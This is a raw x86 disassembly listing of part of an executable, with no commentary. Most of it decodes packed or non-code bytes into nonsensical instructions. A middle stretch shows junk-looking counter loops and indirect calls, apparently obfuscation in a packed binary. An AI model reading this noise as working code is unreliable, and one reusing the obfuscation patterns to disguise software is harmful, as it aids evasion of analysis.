  40a1ac:	mov    DWORD PTR [edx+0x31],esp
  40a1af:	push   0x20
  40a1b1:	add    eax,0x14977710
  40a1b6:	cdq    
  40a1b7:	inc    ecx
  40a1b8:	(bad)  
  40a1b9:	mov    al,0x68
  40a1bb:	in     eax,0x5e
  40a1bd:	sar    DWORD PTR ds:0xc0607d58,cl
  40a1c3:	sahf   
  40a1c4:	icebp  
  40a1c5:	(bad)  
  40a1c6:	jmp    0x40a152
  40a1c8:	scas   eax,DWORD PTR es:[edi]
  40a1c9:	dec    esp
  40a1ca:	in     eax,dx
  40a1cb:	outs   dx,BYTE PTR ds:[esi]
  40a1cc:	push   esi
  40a1cd:	mov    DWORD PTR [eax+0x78],edi
  40a1d0:	jmp    0x40a1d6
  40a1d2:	push   0x41bfdd7d
  40a1d7:	sar    BYTE PTR [ebx+0x5283ae6d],0xcb
  40a1de:	sahf   
  40a1df:	inc    edi
  40a1e0:	cli    
  40a1e1:	sub    DWORD PTR [ebp+0x56],ebp
  40a1e4:	jns    0x40a214
  40a1e6:	fimul  DWORD PTR [esi-0x3c906b6]
  40a1ec:	xchg   BYTE PTR [esi-0x51],ah
  40a1ef:	es loope 0x40a1f2
  40a1f2:	push   ebx
  40a1f3:	jecxz  0x40a221
  40a1f5:	loop   0x40a1ba
  40a1f7:	jmp    0x40a248
  40a1f9:	mov    ch,ah
  40a1fb:	mov    esi,DWORD PTR [ecx]
  40a1fd:	push   0x843f2410
  40a202:	stos   DWORD PTR es:[edi],eax
  40a203:	ins    BYTE PTR es:[edi],dx
  40a204:	inc    esp
  40a205:	jmp    0x416a05a3
  40a20a:	fidivr WORD PTR [ecx-0x5b]
  40a20d:	fsubr  DWORD PTR [eax-0x11e0302d]
  40a213:	inc    esp
  40a214:	push   ebx
  40a215:	leave  
  40a216:	pushf  
  40a217:	mov    edx,ecx
  40a219:	and    eax,0x9a399d7f
  40a21e:	xchg   esp,eax
  40a21f:	mov    WORD PTR [ebx],fs
  40a221:	push   ss
  40a222:	mov    eax,0xb24f1fef
  40a227:	pusha  
  40a228:	daa    
  40a229:	retf   0x2169
  40a22c:	sub    BYTE PTR ds:0xc421476b,dl
  40a232:	pop    esp
  40a233:	jmp    0x40a1f6
  40a235:	ret    0x42b9
  40a238:	inc    eax
  40a239:	mov    WORD PTR ds:0xe053a401,cs
  40a23f:	push   ecx
  40a240:	mov    eax,0x745c680c
  40a245:	sub    al,0x4e
  40a247:	mov    BYTE PTR [eax+ebx*2+0x12],dl
  40a24b:	or     BYTE PTR [ebp-0x7a],cl
  40a24e:	pop    ecx
  40a24f:	jb     0x40a260
  40a251:	addr16 pop esp
  40a253:	cmc    
  40a254:	(bad)  
  40a255:	retf   0x50d
  40a258:	syscall 
  40a25a:	sub    al,0x1a
  40a25c:	lock sbb esi,ebp
  40a25f:	(bad)  
  40a260:	daa    
  40a261:	fs mov dl,0x1d
  40a264:	fild   QWORD PTR [esi+ebx*4+0x5c]
  40a268:	aas    
  40a269:	push   0xc415c5c2
  40a26e:	xchg   edx,eax
  40a26f:	lock mov edx,DWORD PTR [edi]
  40a272:	jnp    0x40a2da
  40a274:	jnp    0x40a2d8
  40a276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a277:	stos   DWORD PTR es:[edi],eax
  40a278:	rep stos BYTE PTR es:[edi],al
  40a27a:	iret   
  40a27b:	xchg   esp,eax
  40a27c:	test   DWORD PTR [ebx],ecx
  40a27e:	xchg   edx,eax
  40a27f:	pusha  
  40a280:	dec    esi
  40a281:	xchg   edi,eax
  40a282:	mov    BYTE PTR [esi-0x62],0x5
  40a286:	aad    0xce
  40a288:	aaa    
  40a289:	push   ebx
  40a28a:	xor    cl,BYTE PTR ds:0x9c653903
  40a290:	and    cl,BYTE PTR [esi+0x40847089]
  40a296:	les    ebp,FWORD PTR ds:0xa11fed8d
  40a29c:	fistp  QWORD PTR [ecx+0x25368d64]
  40a2a2:	xor    dh,BYTE PTR [esi+0x6f]
  40a2a5:	mov    edi,0x9c6cf080
  40a2aa:	cmp    dh,bl
  40a2ac:	mov    edx,ecx
  40a2ae:	and    al,BYTE PTR [edx+0x4767d974]
  40a2b4:	xor    DWORD PTR gs:[ebx],0x6c383a68
  40a2bb:	xor    BYTE PTR [edx+0xcec0f26],dh
  40a2c1:	ret    0x30e7
  40a2c4:	sahf   
  40a2c5:	adc    al,0xb4
  40a2c7:	or     eax,0x6e77bea7
  40a2cc:	inc    esi
  40a2cd:	dec    eax
  40a2ce:	push   ebp
  40a2cf:	or     esi,esp
  40a2d1:	aaa    
  40a2d2:	scas   al,BYTE PTR es:[edi]
  40a2d3:	ficom  DWORD PTR [esi-0xce6c4bd]
  40a2d9:	xor    DWORD PTR [edi],esp
  40a2db:	adc    ebx,edi
  40a2dd:	rcl    BYTE PTR [edx+0x335264f6],cl
  40a2e3:	xchg   ebx,eax
  40a2e4:	push   esi
  40a2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e6:	cs (bad) 
  40a2e8:	pop    DWORD PTR [edx-0x1af81ddc]
  40a2ee:	jns    0x40a34b
  40a2f0:	test   al,0x26
  40a2f2:	(bad)  
  40a2f4:	rol    DWORD PTR [edx-0x566c5a98],cl
  40a2fa:	shl    esp,cl
  40a2fc:	pop    esp
  40a2fd:	pop    es
  40a2fe:	jne    0x40a312
  40a300:	popa   
  40a301:	or     eax,0xf818432a
  40a306:	sahf   
  40a307:	clc    
  40a308:	add    esp,DWORD PTR [ebx-0x59]
  40a30b:	xchg   edx,eax
  40a30c:	cmp    eax,0xccd6c91d
  40a311:	mov    bh,0x27
  40a313:	dec    ebp
  40a314:	clc    
  40a315:	int3   
  40a316:	sub    edx,DWORD PTR [ecx]
  40a318:	dec    edx
  40a319:	jb     0x40a37b
  40a31b:	inc    DWORD PTR [ebp+0x287e8214]
  40a321:	dec    esp
  40a322:	aad    0x72
  40a324:	push   esp
  40a325:	xchg   edx,eax
  40a326:	cmp    BYTE PTR [eax],dl
  40a328:	pushf  
  40a329:	into   
  40a32a:	xor    al,0xf2
  40a32c:	xchg   esp,eax
  40a32d:	pop    ebp
  40a32e:	cmc    
  40a32f:	outs   dx,DWORD PTR ds:[esi]
  40a330:	sbb    ebp,DWORD PTR [edx]
  40a332:	jmp    0x40a39d
  40a334:	pusha  
  40a335:	adc    eax,0xeb21d3d5
  40a33b:	cwde   
  40a33c:	sbb    DWORD PTR ds:0xe32900a9,edx
  40a342:	cmp    BYTE PTR [esi],dl
  40a344:	pop    ds
  40a345:	mov    ?,WORD PTR [edx+0x77]
  40a348:	lds    ebp,FWORD PTR [ecx*4+0x23a89f2c]
  40a34f:	pushw  ds
  40a351:	imul   edx,DWORD PTR [edx+0x5270db6],0x7f
  40a358:	out    0x53,eax
  40a35a:	sbb    bh,cl
  40a35c:	iret   
  40a35d:	mov    eax,ebx
  40a35f:	xor    DWORD PTR [ebp-0x1f],esp
  40a362:	arpl   WORD PTR [ebx+esi*1],dx
  40a365:	xchg   edx,eax
  40a366:	sub    al,0x69
  40a368:	push   ebp
  40a369:	push   es
  40a36a:	test   eax,0xbef7618
  40a36f:	adc    ebp,DWORD PTR [ebp+ebp*4-0x75]
  40a373:	lahf   
  40a374:	jne    0x40a300
  40a376:	or     DWORD PTR [esi+ecx*1-0x36],esp
  40a37a:	call   0xe078:0xa1e93ab3
  40a381:	stc    
  40a382:	clc    
  40a383:	or     dl,ah
  40a385:	dec    edx
  40a386:	dec    esp
  40a387:	call   0x60006782
  40a38c:	cli    
  40a38d:	sub    eax,0xf3c15b66
  40a392:	aam    0xe5
  40a394:	cwde   
  40a395:	inc    esp
  40a396:	(bad)  
  40a397:	cli    
  40a398:	call   0x2467:0x70939c3d
  40a39f:	inc    edi
  40a3a0:	popa   
  40a3a1:	add    al,0xed
  40a3a3:	mov    ds:0xa28d4ac2,al
  40a3a8:	adc    eax,0x485c01f6
  40a3ad:	aas    
  40a3ae:	add    eax,0xc012cb9d
  40a3b3:	push   ss
  40a3b4:	and    BYTE PTR [edi-0x72],cl
  40a3b7:	lds    ebx,FWORD PTR [ebx]
  40a3b9:	pop    ebp
  40a3ba:	mov    ah,0x64
  40a3bc:	shl    DWORD PTR fs:[esi+0xda2fbee],1
  40a3c3:	fisubr WORD PTR [ebp+0x9]
  40a3c6:	scas   eax,DWORD PTR es:[edi]
  40a3c7:	in     eax,dx
  40a3c8:	cmp    eax,DWORD PTR [ecx+0x25]
  40a3cb:	(bad)  
  40a3cd:	lods   eax,DWORD PTR ds:[esi]
  40a3ce:	pop    ebp
  40a3cf:	jge    0x40a3b1
  40a3d1:	call   0x1a31290d
  40a3d6:	add    bl,dh
  40a3d8:	retf   0xfbcd
  40a3db:	push   esp
  40a3dc:	fnstcw WORD PTR [ebx+0x2970fd89]
  40a3e2:	push   edx
  40a3e3:	adc    al,0xd4
  40a3e5:	or     edi,DWORD PTR [edx+0x24]
  40a3e8:	out    0x28,al
  40a3ea:	loopne 0x40a45b
  40a3ec:	js     0x40a3e0
  40a3ee:	inc    ebx
  40a3ef:	xor    edx,DWORD PTR [ebp+ecx*2-0x6d]
  40a3f3:	gs inc esi
  40a3f5:	lods   al,BYTE PTR ds:[esi]
  40a3f6:	aam    0xe6
  40a3f8:	imul   eax,edi,0x45
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434607
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x434573,0x13
  40a427:	cmp    DWORD PTR ds:0x434573,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x434573,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43468f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x434573
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x434573,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x43467b,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x43467b
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x43467b,edx
  40a477:	cmp    DWORD PTR ds:0x43467b,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x434637
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x434927
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x43467b,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x4345cb,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434613,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x4345d3,0x4345cf
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x4345f7,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x4345f7,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434683,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x43464b,0x4345fb
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x4345cf,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x4345cf,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x434573,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x43457b,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x43467b,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434697
  40a564:	mov    edx,DWORD PTR ds:0x4346a7
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x4345bf,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x4345bf
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x4345bf,ebx
  40a58c:	cmp    DWORD PTR ds:0x4345bf,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x4345bf,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x4345bf
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x4345bf,ebx
  40a5bc:	cmp    DWORD PTR ds:0x4345bf,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x4345ff
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x4345b7,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x4345cb,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x4345cb,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x4345cb,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x4345cb
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x4345cb,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x434647,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x4345bf,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x43463f
  40a648:	add    DWORD PTR ds:0x434693,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x4345ff,0x434687
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	repnz neg DWORD PTR [ebx+0x7ef2fa48]
  40a673:	jle    0x40a6e5
  40a675:	jns    0x40a6f5
  40a677:	jle    0x40a6da
  40a679:	dec    ebx
  40a67a:	cmp    DWORD PTR [ebp+0x3c],esp
  40a67d:	lahf   
  40a67e:	adc    ebx,DWORD PTR [edi+esi*8+0x2a3503f1]
  40a685:	sti    
  40a686:	jge    0x40a6fc
  40a688:	ja     0x40a673
  40a68a:	adc    BYTE PTR [ecx-0x48],0x18
  40a68e:	inc    esi
  40a68f:	lea    edi,ds:0x810599a3
  40a695:	lahf   
  40a696:	or     DWORD PTR [ebx+0x19],ecx
  40a699:	jnp    0x40a6d1
  40a69b:	pop    ebp
  40a69c:	dec    edx
  40a69d:	in     al,dx
  40a69e:	fcomp  QWORD PTR [eax-0x59095c9a]
  40a6a4:	xor    eax,0xde7ef40d
  40a6a9:	and    DWORD PTR [esi+eiz*2-0x34527a46],ebp
  40a6b0:	cld    
  40a6b1:	bound  edi,QWORD PTR [edx]
  40a6b3:	shl    al,cl
  40a6b5:	fsubr  QWORD PTR [edx]
  40a6b7:	imul   ecx,edx,0x1f6a14d8
  40a6bd:	inc    edi
  40a6be:	call   0x6d2e:0xadb8eb4b
  40a6c5:	lds    esi,FWORD PTR [edx-0x4d]
  40a6c8:	mov    ebx,0x28db0da2
  40a6cd:	pop    edx
  40a6ce:	gs jae 0x40a655
  40a6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d2:	mov    bl,0xbf
  40a6d4:	push   edi
  40a6d5:	stos   BYTE PTR es:[edi],al
  40a6d6:	mov    esi,0xe0312abd
  40a6db:	pop    ss
  40a6dc:	call   0x8537c126
  40a6e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e2:	push   ss
  40a6e3:	nop
  40a6e4:	xchg   ebp,eax
  40a6e5:	(bad)  
  40a6e6:	lods   al,BYTE PTR ds:[esi]
  40a6e7:	xchg   ecx,eax
  40a6e8:	or     BYTE PTR [edx],al
  40a6ea:	xor    BYTE PTR [ecx+esi*8-0xd],al
  40a6ee:	lea    edx,[ecx]
  40a6f0:	jg     0x40a681
  40a6f2:	xor    eax,0x504bd265
  40a6f7:	pop    edx
  40a6f8:	ja     0x40a67d
  40a6fa:	rol    DWORD PTR [edi+0x4ab155ae],cl
  40a700:	inc    ecx
  40a701:	int3   
  40a702:	mov    esp,0xf291b78b
  40a707:	das    
  40a708:	gs sbb eax,0x8d698108
  40a70e:	repnz in al,0xc8
  40a711:	pop    ebx
  40a712:	xor    al,0xf4
  40a714:	dec    ebx
  40a715:	xlat   BYTE PTR ds:[ebx]
  40a716:	add    BYTE PTR [edi],0x20
  40a719:	lods   eax,DWORD PTR ds:[esi]
  40a71a:	(bad)  [esi+ebx*2+0x473354de]
  40a721:	push   ds
  40a722:	ss addr16 pushf 
  40a725:	addr16 mov bl,0xe9
  40a728:	test   DWORD PTR [ecx],0xc187a9bb
  40a72e:	and    eax,0xeceb20f0
  40a733:	add    ecx,eax
  40a735:	fidivr WORD PTR [bx-0x7631]
  40a73a:	dec    esi
  40a73b:	xchg   esp,eax
  40a73c:	and    eax,edi
  40a73e:	imul   ecx,DWORD PTR [edx],0xf5e692d8
  40a744:	test   edx,ebp
  40a746:	leave  
  40a747:	sub    bh,BYTE PTR [edx-0x2b80a2bf]
  40a74d:	adc    BYTE PTR [edx+eax*1],bl
  40a750:	int    0x38
  40a752:	inc    ebx
  40a753:	daa    
  40a754:	ss and al,0xd
  40a757:	mov    al,ds:0x51c481ad
  40a75c:	dec    edx
  40a75d:	and    DWORD PTR [edi-0x7a],ebp
  40a760:	shl    BYTE PTR [ebx],cl
  40a762:	jne    0x40a765
  40a764:	mov    ds:0x8036bcfb,eax
  40a769:	loop   0x40a76d
  40a76b:	cmp    DWORD PTR [esi+0x4f],ebx
  40a76e:	mov    ebx,0xd438225c
  40a773:	stos   DWORD PTR es:[edi],eax
  40a774:	jne    0x40a751
  40a776:	xchg   edx,eax
  40a777:	pusha  
  40a778:	and    eax,0x802a06cd
  40a77d:	dec    ebx
  40a77e:	xor    bh,BYTE PTR [edx-0x32]
  40a781:	push   ds
  40a782:	pop    es
  40a783:	mov    ecx,0xa61916cb
  40a788:	xor    al,BYTE PTR [ebp-0x7b8dc42d]
  40a78e:	mov    ebp,0x82964431
  40a793:	xchg   ecx,eax
  40a794:	and    dh,bh
  40a796:	xchg   BYTE PTR [esi-0x44e27895],dh
  40a79c:	inc    eax
  40a79d:	and    BYTE PTR ds:0x39d41dd9,ch
  40a7a3:	test   esp,esi
  40a7a5:	push   es
  40a7a6:	xor    dh,BYTE PTR [ebp-0x7f]
  40a7a9:	mov    ah,0x81
  40a7ab:	mov    ah,0xe8
  40a7ad:	inc    ebx
  40a7ae:	xor    DWORD PTR [ecx],edx
  40a7b0:	mov    ah,0xca
  40a7b2:	mov    edi,0x383c1cfb
  40a7b7:	imul   edi,edi,0xffffffd3
  40a7ba:	out    0x87,eax
  40a7bc:	mov    al,0xb7
  40a7be:	mov    cl,0x37
  40a7c0:	push   es
  40a7c1:	push   ebp
  40a7c2:	and    bl,bh
  40a7c4:	push   ss
  40a7c5:	add    DWORD PTR [ecx+esi*8],ebp
  40a7c8:	pushf  
  40a7c9:	fiadd  WORD PTR [edx+0xb]
  40a7cc:	cmp    eax,0xa8f97ff9
  40a7d1:	stc    
  40a7d2:	adc    eax,0x67e8e59f
  40a7d7:	shl    DWORD PTR [ebx-0x56],1
  40a7da:	imul   DWORD PTR [edx]
  40a7dc:	rcl    eax,cl
  40a7de:	jbe    0x40a779
  40a7e0:	enter  0x2c1a,0x82
  40a7e4:	in     eax,0x12
  40a7e6:	scas   al,BYTE PTR es:[edi]
  40a7e7:	sti    
  40a7e8:	sbb    dh,BYTE PTR [ebp+0x68da6036]
  40a7ee:	push   ds
  40a7ef:	pusha  
  40a7f0:	shr    DWORD PTR [edx+0x15],1
  40a7f3:	pop    ebp
  40a7f4:	repz and esp,edi
  40a7f7:	push   esi
  40a7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7f9:	(bad)
  40a7fc:	sbb    edi,DWORD PTR [edx+0x1e]
  40a7ff:	add    al,0xe6
  40a801:	dec    ecx
  40a802:	rol    esi,cl
  40a804:	add    al,0x21
  40a806:	sahf   
  40a807:	iret   
  40a808:	test   BYTE PTR [edi+esi*1-0x31fc9623],bl
  40a80f:	imul   esi,ecx,0xf195675
  40a815:	lock mov eax,ds:0x7b64f1f0
  40a81b:	ror    BYTE PTR [edx+eiz*4+0x74bd1896],1
  40a822:	leave  
  40a823:	xor    DWORD PTR [edx-0x5],edi
  40a826:	out    0x28,al
  40a828:	aas    
  40a829:	in     al,dx
  40a82a:	mov    edi,0x4fbdd6ad
  40a82f:	jl     0x40a82e
  40a831:	dec    esi
  40a832:	out    dx,al
  40a833:	and    cl,ah
  40a835:	add    ch,cl
  40a837:	out    0x35,eax
  40a839:	arpl   WORD PTR [edx],si
  40a83b:	test   eax,0xd5128c2c
  40a840:	bound  eax,QWORD PTR [edx+edi*8]
  40a843:	jne    0x40a800
  40a845:	test   eax,0xefd9d346
  40a84a:	pop    es
  40a84b:	std    
  40a84c:	push   ds
  40a84d:	push   esi
  40a84e:	sub    eax,0x68092158
  40a853:	loope  0x40a85b
  40a855:	arpl   WORD PTR [esi-0x7f],dx
  40a858:	pop    edx
  40a859:	test   al,0x47
  40a85b:	mov    esi,0xe4ad3aaf
  40a860:	aas    
  40a861:	xor    al,0x99
  40a863:	or     eax,DWORD PTR [eax]
  40a865:	minps  xmm4,xmm5
  40a868:	hlt    
  40a869:	in     eax,0xab
  40a86b:	in     al,dx
  40a86c:	xchg   edx,eax
  40a86d:	pushf  
  40a86e:	or     al,0x14
  40a870:	inc    ebp
  40a871:	adc    al,0x20
  40a873:	outs   dx,BYTE PTR ds:[esi]
  40a874:	adc    BYTE PTR ss:[eax+0x4e3ee042],bl
  40a87b:	loope  0x40a864
  40a87d:	mov    dh,0x92
  40a87f:	pusha  
  40a880:	ss fs aam 0xde
  40a884:	dec    ebx
  40a885:	mov    ebx,0x3e4851ee
  40a88a:	xor    DWORD PTR [edx+0x6ecc8212],edx
  40a890:	or     ah,cl
  40a892:	mov    edi,DWORD PTR [eax]
  40a894:	aaa    
  40a895:	outs   dx,DWORD PTR ds:[esi]
  40a896:	mov    al,0x90
  40a898:	out    0xa6,eax
  40a89a:	into   
  40a89b:	ss add eax,0x6e4ad493
  40a8a1:	and    eax,0x5a24ed40
  40a8a6:	loop   0x40a8cc
  40a8a8:	mov    dl,0x21
  40a8aa:	mov    ebp,0x76031bbd
  40a8af:	or     ebp,DWORD PTR [esi]
  40a8b1:	push   edx
  40a8b2:	iret   
  40a8b3:	sub    dl,BYTE PTR [esi-0x35f583ca]
  40a8b9:	shr    DWORD PTR [ebx+0x57],0xf4
  40a8bd:	outs   dx,DWORD PTR ds:[esi]
  40a8be:	push   cs
  40a8bf:	loope  0x40a866
  40a8c1:	lods   al,BYTE PTR ds:[esi]
  40a8c2:	mov    edx,0xd1fa362
  40a8c7:	les    eax,FWORD PTR [esi]
  40a8c9:	mov    ecx,0x16935d0b
  40a8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8cf:	add    dl,BYTE PTR [eax-0x7f212454]
  40a8d5:	iret   
  40a8d6:	pop    es
  40a8d7:	pop    ds
  40a8d8:	(bad)  
  40a8d9:	mov    dh,0x4a
  40a8db:	out    0x2a,eax
  40a8dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8de:	and    al,0xb6
  40a8e0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40a8e2:	scas   eax,DWORD PTR es:[edi]
  40a8e3:	fsubr  QWORD PTR [edx-0x7e]
  40a8e6:	(bad)  
  40a8e7:	or     dh,dh
  40a8e9:	sub    bl,bh
  40a8eb:	ss inc ebx
  40a8ed:	pop    edi
  40a8ee:	cmp    eax,0xf4ba61f0
  40a8f3:	fistp  QWORD PTR [ebx]
  40a8f5:	jp     0x40a8b5
  40a8f7:	arpl   WORD PTR gs:[esi],si
  40a8fa:	test   eax,0xa56ef7ee
  40a8ff:	dec    edx
  40a900:	imul   ebx,DWORD PTR [ebx+0x7a43db0e],0xffffffa7
  40a907:	(bad)  
  40a908:	test   eax,0xc88955ed
  40a90d:	push   eax
  40a90e:	and    BYTE PTR [ebp+0x298573d2],0x47
  40a915:	jno    0x40a993
  40a917:	ins    BYTE PTR es:[edi],dx
  40a918:	sbb    bh,BYTE PTR [esi+ebp*4]
  40a91b:	fst    DWORD PTR [eax]
  40a91d:	les    esi,FWORD PTR ss:[esi]
  40a920:	out    0x6,al
  40a922:	mov    ds:0x3293e4c,al
  40a927:	dec    eax
  40a928:	in     al,0x11
  40a92a:	push   0x43935cd4
  40a92f:	mov    edi,ebp
  40a931:	pop    eax
  40a932:	lods   eax,DWORD PTR ds:[esi]
  40a933:	pop    esi
  40a934:	imul   ebx,ebx,0xfffffffe
  40a937:	and    BYTE PTR [ebx],dh
  40a939:	xchg   esp,eax
  40a93a:	ins    DWORD PTR es:[edi],dx
  40a93b:	adc    al,0x3
  40a93d:	pop    esp
  40a93e:	sbb    al,0x4a
  40a940:	or     cl,cl
  40a942:	push   esp
  40a943:	push   esi
  40a944:	pop    edi
  40a945:	pop    edx
  40a946:	dec    eax
  40a947:	xchg   esp,eax
  40a948:	scas   al,BYTE PTR es:[edi]
  40a949:	(bad)  
  40a94a:	and    eax,0x669bd65b
  40a94f:	scas   eax,DWORD PTR es:[edi]
  40a950:	rcr    DWORD PTR [edx-0x4aa69fcd],cl
  40a956:	fwait
  40a957:	out    0xcd,eax
  40a959:	popf   
  40a95a:	and    DWORD PTR [edx-0x63876ab6],edx
  40a960:	cs sbb eax,0xd55ab270
  40a967:	clc    
  40a968:	cwde   
  40a969:	push   edx
  40a96a:	das    
  40a96b:	clc    
  40a96c:	ds inc edx
  40a96e:	dec    ecx
  40a96f:	fs jp  0x40a9b5
  40a972:	mov    ebx,0x24216b36
  40a977:	jmp    0xe100fa99
  40a97c:	xor    BYTE PTR [ecx],ch
  40a97e:	les    ebx,FWORD PTR [edi-0x567dc99c]
  40a984:	cwde   
  40a985:	xchg   DWORD PTR [ebx],esi
  40a987:	jle    0x40aa04
  40a989:	int3   
  40a98a:	and    esi,ecx
  40a98c:	xchg   esp,eax
  40a98d:	ret    
  40a98e:	ins    DWORD PTR es:[edi],dx
  40a98f:	lea    ebx,[ecx-0x21]
  40a992:	mov    ds:0xa97e3d43,eax
  40a997:	mov    bl,0x67
  40a999:	test   al,0xa8
  40a99b:	inc    esi
  40a99c:	neg    BYTE PTR [ebx+0x1]
  40a99f:	and    eax,0x4f4880c1
  40a9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a5:	ss call 0x70f6:0xed3c0e3e
  40a9ad:	fs ja  0x40a965
  40a9b0:	in     eax,dx
  40a9b1:	add    DWORD PTR [eax+edi*8],esp
  40a9b4:	jae    0x40aa07
  40a9b6:	adc    DWORD PTR [ecx-0x9],ebx
  40a9b9:	rcr    BYTE PTR [ebx+0x200f0fe8],0x88
  40a9c0:	dec    ecx
  40a9c1:	cmp    BYTE PTR [edx+eax*2+0x1074707c],bl
  40a9c8:	stos   DWORD PTR es:[edi],eax
  40a9c9:	sub    BYTE PTR [edi-0xb],ch
  40a9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9cd:	push   ebx
  40a9ce:	in     al,dx
  40a9cf:	ror    BYTE PTR [ebx+0x31],cl
  40a9d2:	aam    0xf9
  40a9d4:	std    
  40a9d5:	std    
  40a9d6:	test   eax,0xf57cb113
  40a9db:	pop    edx
  40a9dc:	mov    ebp,0x2a9262d3
  40a9e1:	cmp    esp,DWORD PTR [edx]
  40a9e3:	inc    edx
  40a9e4:	(bad)  
  40a9e5:	cmp    ah,dh
  40a9e7:	test   BYTE PTR [ebx+0x7d343778],al
  40a9ed:	xchg   ecx,eax
  40a9ee:	cmp    ebp,ebp
  40a9f0:	dec    eax
  40a9f1:	in     al,dx
  40a9f2:	sub    BYTE PTR [edx-0x4d],bh
  40a9f5:	dec    edi
  40a9f6:	adc    cl,BYTE PTR [esi-0x302200a9]
  40a9fc:	and    ah,BYTE PTR [ecx]
  40a9fe:	pop    edi
  40a9ff:	cwde   
  40aa00:	adc    eax,0xbaf80c09
  40aa05:	popa   
  40aa06:	sbb    al,BYTE PTR [ecx-0x43510eeb]
  40aa0c:	fimul  DWORD PTR [ecx+0x75f2031d]
